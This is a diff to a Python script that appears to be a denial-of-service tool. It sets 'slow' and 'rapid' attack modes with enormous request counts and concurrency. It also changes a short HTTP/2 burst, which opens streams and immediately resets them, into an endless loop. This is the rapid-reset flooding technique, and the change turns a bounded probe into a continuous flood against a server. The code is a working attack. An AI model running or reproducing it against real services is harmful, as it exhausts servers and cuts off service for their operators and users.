@@ -229,19 +229,19 @@ if len(sys.argv) > 1:
         MODE = requested_mode
 
 if MODE == "slow":
-    TOTAL_REQUESTS = 10000000000000000000000000000
+    TOTAL_REQUESTS = 100000000
     DELAY_BETWEEN_REQ = 0.0
     MAX_CONCURRENT = 1000
     JITTER = 0.0
     BYTE_RATE_PER_SECOND = 1
 elif MODE == "rapid":
-    TOTAL_REQUESTS = 10000000000000000000000000000
+    TOTAL_REQUESTS = 100000000
     DELAY_BETWEEN_REQ = 0.0
-    MAX_CONCURRENT = 1000
+    MAX_CONCURRENT = 5
     JITTER = 0.0
     BYTE_RATE_PER_SECOND = None
 else:
-    TOTAL_REQUESTS = 10000000000000000000000000000
+    TOTAL_REQUESTS = 100000000
     DELAY_BETWEEN_REQ = 0.0001
     MAX_CONCURRENT = 10000
     JITTER = 0.005
@@ -391,16 +391,19 @@ async def run_rapid_http2_burst(check_cfg: dict, payload: dict) -> tuple[bool, s
             ("accept", payload["accept"]),
         ]
 
-        for _ in range(3):
+        inter = 0
+
+        while True:
             stream_id = conn.get_next_available_stream_id()
             conn.send_headers(stream_id, headers, end_stream=False)
-            conn.send_rst_stream(stream_id, ErrorCodes.CANCEL)
-            writer.write(conn.data_to_send())
-            await writer.drain()
-            await asyncio.sleep(0.001)
+            conn.reset_stream(stream_id, error_code=ErrorCodes.CANCEL)
 
-        return True, "http2-burst"
+            writer.write(conn.data_to_send())
+            inter += 1
+            await writer.drain() 
+
     except Exception as exc:
+        print(f"[-] ITER {inter} Rapid mode error: {exc}")
         return False, str(exc)
     finally:
         writer.close()
